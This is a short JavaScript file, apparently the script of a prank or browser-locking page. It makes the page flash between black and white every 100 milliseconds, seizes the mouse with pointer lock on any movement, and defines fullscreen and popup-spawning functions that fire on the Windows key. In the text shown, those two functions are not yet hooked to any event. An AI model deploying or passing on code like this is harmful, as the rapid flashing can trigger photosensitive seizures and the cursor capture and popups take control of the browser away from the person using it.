var text = document.getElementsByTagName('p')[0]
var bg = document.getElementsByClassName('back')[0]
var body = document.getElementsByTagName('body')[0]
var canvas = document.getElementById('canvas')
var stopped = 0
color = 'black'

function invert() {
  if (color == 'black'){
    bg.style.background = "black"
    text.style.color = "white"
    color = 'white'
  } else {
    bg.style.background = "white"
    text.style.color = "black"
    color = 'black'
  }
}
function fullscreen() {
  if (stopped != 1){
        body.webkitRequestFullscreen()
      }
}
invert()
setInterval(invert, 100)

body.requestPointerLock = body.requestPointerLock ||
                            body.mozRequestPointerLock||
                            body.webkitRequestPointerLock;

body.onmousemove = function() {
  body.requestPointerLock()
     //body.webkitRequestFullscreen()
}
  function uniKeyCode(event) {
  var key = event.keyCode;
  if (key == 91){
   for (i = 0; i < 5; i++){
    var newWindow = window.open();
    newWindow.document.write("ohai");
   }
  }
}
